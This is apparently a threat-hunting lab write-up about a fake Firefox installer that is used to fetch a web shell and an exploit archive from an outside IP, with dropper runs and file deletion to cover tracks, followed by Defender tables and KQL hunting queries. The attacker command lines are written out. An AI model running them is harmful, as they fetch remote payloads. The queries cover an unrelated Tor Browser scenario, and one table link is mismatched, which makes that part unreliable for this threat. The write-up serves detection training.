# Threat Event (Firefox Used as a Web Shell Relay)
**Detection of Unauthorized Firefox Installation and Malicious Activity on Workstation: snet**

## Steps the "Bad Actor" took Create Logs and IoCs:
1. Downloaded a modified Firefox installer disguised as a legitimate file: ```Firefox Installer.exe``` saved under ```C:\Users\employee0\Downloads\```.
2. Executed the installer silently through ```setup-stub.exe``` with custom arguments: ```setup-stub.exe -no-remote -profile "C:\Users\employee0\Downloads\Temp\MalProfile" http://172.203.80.23/exploit.zip```
3. Executed again using a different payload hosted on a remote web server: ```setup-stub.exe -no-remote -profile "C:\Users\employee0\Downloads\Temp\MalProfile" http://172.203.80.23/admin/shell.php```
4. Multiple dropper executions occurred via ```download.exe``` in quick succession, indicating staged infection:                                    ```"download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nskC4FD.tmp\config.ini
"download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nso90D.tmp\config.ini
"download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nss9E77.tmp\config.ini```
5. ```Firefox.exe``` was later deleted from the installation directory to remove evidence:                                                              ```ActionType: FileDeleted
FileName: firefox.exe
FolderPath: C:\Program Files\Mozilla Firefox\
InitiatingProcessCommandLine: setup-stub.exe -no-remote -profile "C:\Users\employee0\Downloads\Temp\MalProfile" http://172.203.80.23/admin/shell.php```
6. These actions created multiple temporary and malicious profile directories ```(Temp\MalProfile)``` to host payloads and connect to remote command servers.

---

## Tables Used to Detect IoCs:
| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceFileEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table|
| **Purpose**| Used to detect Firefox installer downloads, temporary profile creation, and file deletion (covering tracks). |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceProcessEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used to detect ```download.exe```, ```setup-stub.exe```, and malicious command-line arguments used to install and execute payloads.|

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceNetworkEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table|
| **Purpose**| Used to detect external web connections initiated by Firefox and setup-stub to remote IPs (e.g., 172.203.80.23).|

---

## Related Queries:
```kql
// Installer name == tor-browser-windows-x86_64-portable-(version).exe
// Detect the installer being downloaded
DeviceFileEvents
| where FileName startswith "tor"

// TOR Browser being silently installed
// Take note of two spaces before the /S (I don't know why)
DeviceProcessEvents
| where ProcessCommandLine contains "tor-browser-windows-x86_64-portable-14.0.1.exe  /S"
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine

// TOR Browser or service was successfully installed and is present on the disk
DeviceFileEvents
| where FileName has_any ("tor.exe", "firefox.exe")
| project  Timestamp, DeviceName, RequestAccountName, ActionType, InitiatingProcessCommandLine

// TOR Browser or service was launched
DeviceProcessEvents
| where ProcessCommandLine has_any("tor.exe","firefox.exe")
| project  Timestamp, DeviceName, AccountName, ActionType, ProcessCommandLine

// TOR Browser or service is being used and is actively creating network connections
DeviceNetworkEvents
| where InitiatingProcessFileName in~ ("tor.exe", "firefox.exe")
| where RemotePort in (9001, 9030, 9040, 9050, 9051, 9150)
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl
| order by Timestamp desc

// User shopping list was created and, changed, or deleted
DeviceFileEvents
| where FileName contains "shopping-list.txt"
```

---

## Created By:
- **Author Name**: Antonio Francisco
- **Author Contact**: https://www.linkedin.com/in/antoniofrancisco-085948210/
- **Date**: October 06, 2025

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**

---

## Revision History:
| **Version** | **Changes**                   | **Date**         | **Modified By**   |
|-------------|-------------------------------|------------------|-------------------|
| 1.0         | Initial draft                  | `October 06, 2025`  | `Antonio Francisco`   
